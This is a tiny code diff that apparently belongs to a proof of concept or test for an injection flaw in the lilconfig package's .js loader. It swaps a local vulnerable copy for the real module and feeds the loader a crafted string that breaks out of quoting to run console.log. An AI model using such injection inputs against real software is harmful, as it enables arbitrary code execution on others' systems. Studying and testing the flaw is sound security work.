@@ -1,3 +1,3 @@
-const { defaultLoaders } = require('./vulnerable_slice');
+const { defaultLoaders } = require('lilconfig');
 const maliciousInput = "'+console.log('EXPLOITED!!')+'";
 defaultLoaders[".js"](maliciousInput);
